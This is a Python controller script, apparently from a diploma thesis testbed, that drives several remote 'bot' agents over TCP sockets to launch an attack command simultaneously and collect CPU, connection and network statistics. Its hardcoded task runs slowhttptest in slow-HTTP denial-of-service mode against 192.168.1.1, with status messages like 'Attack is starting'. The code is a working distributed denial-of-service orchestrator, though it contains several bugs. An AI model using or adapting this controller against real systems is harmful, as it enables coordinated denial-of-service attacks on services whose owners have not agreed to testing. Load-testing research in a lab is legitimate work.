#!/usr/bin/env python3
from os import stat
from queue import Empty
import socket
import json
import multiprocessing
import time
from turtle import st
import sockhelper
from datetime import datetime

buffer_size = 1024
socket_timeout = 10
status_list = {}

#############################
# Documentation of the code is in diploma thesis
#############################

def main():
    print("testing")
    agent_list = [("localhost", 10050), ("localhost", 10051),
                  ("192.168.1.102", 10050)]
    global status_list
    result_queue = multiprocessing.Queue()
    done_queue = multiprocessing.Queue()
    delay = 3/len(agent_list)
    procs = []
    for agent in agent_list:
        proc = multiprocessing.Process(target=agent_worker, args=((agent,{"command":"run","cmd_to_run":["slowhttptest","-u","http://192.168.1.1","-g","-o","file","-l","60"]},result_queue,done_queue,".",2)))  # instantiating without any argument
        procs.append(proc)
        proc.start()
        status_list[agent] = {"cpu": 0, "memory": 0,
                              "connections": {}, "nicstat": []}
        print("Delay", delay, "between launching")
        time.sleep(delay)

    done = multiprocessing.Process(
        target=done_func, args=((done_queue, agent_list)))
    done.start()
    while True:
        res = result_queue.get()
        if "message" in res:
            if res["message"] == "DONE":
                agent_list.remove(res["agent"])
                del status_list[res["agent"]]
                print("finishing agent", res["agent"])
                if len(agent_list) == 0:
                    print("all agents finished")
                    break
        if "result" in res:
            if "current_stats" in res["result"]:
                # update_gui(res)
                print(res)

    if done.is_alive:
        done.terminate()

def run_agents(agent_list: list, status_queue: multiprocessing.Queue, agg_results_queue: multiprocessing.Queue, task: dict, results_path: str, status_period: int, start_period: int):
    result_queue = multiprocessing.Queue()
    done_queue = multiprocessing.Queue()
    delay = start_period/len(agent_list)
    if status_period < 1:
        status_period = 1
    procs = []
    agg_results_queue.put({"message":"Attack is starting, delay between bot start is {} secs".format(delay)})
    for agent in agent_list:
        proc = multiprocessing.Process(target=agent_worker, args=(
            (agent, task, result_queue, done_queue, results_path, status_period)))
        procs.append(proc)
        proc.start()
        status_list[agent] = {"cpu": 0, "memory": 0,
                              "connections": {}, "nicstat": []}
        print("Delay", delay, "between launching")
        time.sleep(delay)

    done = multiprocessing.Process(target=done_func, args=(
        (done_queue, status_queue, agent_list)))
    done.start()
    start_time=datetime.now()
    agg_results_queue.put({"message":"{} bot(s) has/have been initialized".format(len(agent_list))})
    while True:
        res = result_queue.get()
        if "message" in res:
            if res["message"] == "DONE":
                agent_list.remove(res["agent"])
                del status_list[res["agent"]]
                print("finishing agent", res["agent"])
                agg_results_queue.put({"message":"Finishing bot {}".format(res["agent"])})
                if len(agent_list) == 0:
                    print("all agents finished")
                    agg_results_queue.put({"message":"All agents have finished"})
                    agg_results_queue.put("DONE")
                    break
        if "result" in res:
            if "current_stats" in res["result"]:
                agg_results_queue.put({"message":"{} bots are running for {}".format(len(agent_list),datetime.now()-start_time)})
                update_gui(res, agg_results_queue)

    if done.is_alive:
        done.terminate()


def update_gui(status: dict, results_queue: multiprocessing.Queue):
    global status_list
    print(status)
    current = status["result"]["current_stats"]
    key = (status["agent"][0], status["agent"][1])
    agent = status_list[key]
    agent["cpu"] = current["cpu"]
    agent["memory"] = current["memory"]
    agent["connections"] = current["connections"]
    agent["nicstat"] = current["nicstat"]
    aggregated = get_actual_stats()
    print("agg", aggregated)
    results_queue.put(aggregated)


def get_actual_stats() -> dict:
    global status_list
    running_agents = len(status_list)
    cpu = 0
    memory = 0
    established = 0
    sync_sent = 0
    packet_sent = 0
    packet_rcv = 0
    bytes_sent = 0
    bytes_rcv = 0

    for item in status_list:
        cpu += status_list[item]["cpu"]
        memory += status_list[item]["memory"]
        if "SYNC_SENT" in status_list[item]["connections"]:
            sync_sent += status_list[item]["connections"]["SYNC_SENT"]
        if "ESTABLISHED" in status_list[item]["connections"]:
            established += status_list[item]["connections"]["ESTABLISHED"]
        if len(status_list[item]["nicstat"]) > 7:
            bytes_sent += status_list[item]["nicstat"][0]
            bytes_rcv += status_list[item]["nicstat"][1]
            packet_sent += status_list[item]["nicstat"][3]
            packet_rcv += status_list[item]["nicstat"][4]

    return {"memory": memory, "cpu": cpu/running_agents, "running_agents": running_agents, "connections_established": established, "connections_sync_sent": sync_sent,
            "nic_bytes_sent": bytes_sent, "nic_bytes_received": bytes_rcv, "nic_packet_sent": packet_sent, "nic_packet_received": packet_rcv}


def done_func(done: multiprocessing.Queue, status_queue: multiprocessing.Queue, agent_list: list):
    # waiting until parent process or main process itself will send a message
    status_queue.get(block=True)
    for x in range(len(agent_list)):
        done.put("DONE")
    return


def agent_worker(server_address: tuple, command: dict, result_queue: multiprocessing.Queue, done: multiprocessing.Queue, path_result: str, period: float):
    try:
        ping = send_message(server_address, {"command": "ping"})
    except:
        print("Agent is not reachable")
        result_queue.put({"message": "DONE", "agent": server_address})
        return
    # get the timestamp shift on remote agent (reduce latency)
    shift = ping["result"]
    shift = time.time()-shift
    # launch the command on the agent
    try:
        # try to stop, if anything is running on the agent
        send_message(server_address, {"command": "stop"})
        launch = send_message(server_address, command)

        if launch["result"]["message"] == "Failed":
            print("Command failed to start with the reason",
                  launch["result"]["error"])
            result_queue.put({"message": "DONE", "agent": server_address})
            return
    except:
        print("Something wrong with command stop")
        result_queue.put({"message": "DONE", "agent": server_address})
        return
    # start loop until command is running or done queue get message

    # initializing stats csv file
    try:
        fs = open("{}/{}_{}.csv".format(path_result,
                  server_address[0], server_address[1]), "w")
        fs.write("timestamp,cpu,memory,connections_established,connections_syncsent,connections_sync_recv,connections_timewait,bytes_sent,bytes_recv,packets_sent,packets_recv,errin,errout,dropin,dropout\n")
    except:
        print("File could not be created")
    finally:
        fs.close()

    while True:
        try:
            # wait for a period
            time.sleep(period)
            # non blocking read
            done = done.get(block=False)
            # done queue was consumed with the message, stop command and process details
            try:
                print(
                    "Done message received, stop the command on the agent, process details command and exit")
                stop = send_message(server_address, {"command": "stop"})
            except:
                print("Something wrong command stop")
                result_queue.put({"message": "DONE", "agent": server_address})
                return
        # exception Empty is ignored, others processed as error
        except Empty:
            pass
        except:
            print("Something wrong receiving message from the queue")
            # try to stop
            send_message(server_address, {"command": "stop"})
            result_queue.put({"message": "DONE", "agent": server_address})
            return
        # get the status and process it
        try:
            status = send_message(server_address, {"command": "status"})
            is_running = process_status(
                path_result, status, result_queue, shift)
        except Exception as e:
            print("Something wrong sending message status", e.args(0))

        try:
            # write lines of the stats to the files
            write_status(path_result, status, shift)
        except:
            print("Something wrong writing a status")

        if is_running == False:
            # process details and exit
            try:
                details = send_message(server_address, {"command": "details"})
                process_details(path_result, details)
            except:
                print("Something wrong sending a message details")
            result_queue.put({"message": "DONE", "agent": server_address})
            return


def process_details(path_result: str, details: dict):

    print("Processint details", details)
    d = details["result"]["process_details"]
    if "stdout" in d:
        fname = "{}/{}_{}_stdout.txt".format(path_result,
                                             details["agent"][0], details["agent"][1])
        fs = open(fname, "w")
        fs.write(d["stdout"])
        fs.flush()
        fs.close()
    if "stderr" in d:
        fname = "{}/{}_{}_stderr.txt".format(path_result,
                                             details["agent"][0], details["agent"][1])
        fs = open(fname, "w")
        fs.write(d["stderr"])
        fs.flush()
        fs.close()
    if "downloads" in d:
        for item in d["downloads"]:
            fname = "{}/{}_{}_{}".format(path_result,
                                         details["agent"][0], details["agent"][1], item)
            fs = open(fname, "w")
            fs.write(d["downloads"][item])
            fs.flush()
            fs.close()


# process status
# if process is not running anymore, process_status return False
def process_status(path_result: str, status: dict, result_queue: multiprocessing.Queue, shift: int) -> bool:
    print("Processing status with shift", shift)
    if status == None:
        return True
    result_queue.put(status)
    return status["result"]["message"] == "IsRunning"


def con(ctype: str, d: dict) -> str:
    if ctype in d:
        return d[ctype]
    return 0


def write_status(path_result: str, status: dict, delay: int):
    fname = "{}/{}_{}.csv".format(path_result,
                                  status["agent"][0], status["agent"][1])
    try:
        fs = open(fname, "a")
        s = status["result"]["current_stats"]
        fs.write("{},{},{},{},{},{},{},{},{},{},{},{},{}\n".format(s["timestamp"]+delay, s["cpu"], s["memory"], con("ESTABLISHED", s["connections"]), con("SYNC_SENT", s["connections"]), con(
            "SYNC_RECV", s["connections"]), con("TIME_WAIT", s["connections"]), s["nicstat"][0], s["nicstat"][1], s["nicstat"][2], s["nicstat"][3], s["nicstat"][4], s["nicstat"][5]))
    except:
        print("Could not open or append to the file".format(fs.name))
    finally:
        fs.close()


def send_message(server_address: tuple, cmd: dict) -> dict:
    global buffer_size
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # check if the agent responds
    print('connecting to {} port {}'.format(*server_address))
    sock.connect(server_address)

    try:
        message = json.dumps(cmd).encode()
        print('sending {!r}'.format(message))
        sockhelper.send_msg(sock, message)
        # sock.sendall(message)
        data = sockhelper.recv_msg(sock)
        response = json.loads(data)

        # print(response)
    except Exception as e:
        print(data)
        return None
    finally:
        print('closing socket')
        sock.close()
    return response


if __name__ == "__main__":
    main()
